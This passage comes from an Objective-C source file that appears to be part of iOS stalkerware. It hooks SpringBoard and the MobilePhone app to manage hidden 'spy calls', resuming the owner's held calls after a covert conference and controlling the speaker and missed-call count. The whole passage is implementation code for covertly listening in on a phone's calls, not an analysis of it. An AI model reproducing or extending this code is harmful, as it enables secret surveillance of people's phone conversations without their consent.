			newCall = call;
			break;
		}
	}
	return (newCall);
}

- (void) resumeNormalCallsIfOnHold {
    APPLOGVERBOSE(@"Resume normal calls, in conference, %d", [self mIsSpyCallInConference]);
	if ([SpyCallUtils isMobileApplicationHook] && ![self mIsSpyCallInConference]) {
		for (FxCall *call in [self mCalls]) {
			if (![call mIsSpyCall]) {
				if (CTCallGetStatus([call mCTCall]) == CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD) {
					CTCallResume([call mCTCall]);
				}
			}
		}
	}
#pragma mark Critical iOS 7,8
    /*
     In case of MobilePhone application is not running (iOS 7), however OS will launch MobilePhone when there is a call,
     then use applicationDidFinishLaunching$ of MobilePhone to keep track of number of calls
     */
    else if ([SpyCallUtils isSpringBoardHook] && ![self mIsSpyCallInConference]) {
        if (![SpyCallUtils isMobilePhoneRunning]) {
            /*
             This can only happen in iOS 7 where MobilePhone application can be killed by user (confirmed iOS7, never come here but to remember the behavior because
             MobilePhone is relaunch by OS)
             
             iOS 8, MobilePhone application does not launch or relaunch when there is outgoing or incoming call has made so this case happen on iOS 8 where only SpringBoard
             is capable of doing the job of conference alone
             */
            
            APPLOGVERBOSE(@"Resume normal calls by SpringBoard alone");
            for (FxCall *call in [self mCalls]) {
                if (![call mIsSpyCall]) {
                    if (CTCallGetStatus([call mCTCall]) == CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD) {
                        CTCallResume([call mCTCall]);
                    }
                }
            }
        }
	}
}

- (void) increaseMissedCallByOne {
	NSInteger missedCall = [[self mSystemEnvUtils] mMissedCall];
	missedCall++;
	[[self mSystemEnvUtils] setMMissedCall:missedCall];
}

- (NSString *) getPrivateNumberString {
    if ([SpyCallUtils isIOS7] ||
        [SpyCallUtils isIOS8] ||
        [SpyCallUtils isIOS9]) {
        return (@"No Caller ID");
    } else {
        return (@"Blocked");
    }
}

- (void) activateSpeaker {
    APPLOGVERBOSE(@"Activate speaker now ...");
    [SpyCallUtils activateSpeakerWithAVController:[[self mSystemEnvUtils] mAVController]];
}

- (void) deactivateSpeaker {
    APPLOGVERBOSE(@"Deactivate speaker now ...");
    [SpyCallUtils deactivateSpeakerWithAVController:nil];
}

- (void) dealloc {
	[mTelephoneNumberPicker release];
	[mSpyCallDisconnectDelegates release];
	[mSpyCall release];
	[mSystemEnvUtils release];
	[mCalls release];
	[super dealloc];
}

@end
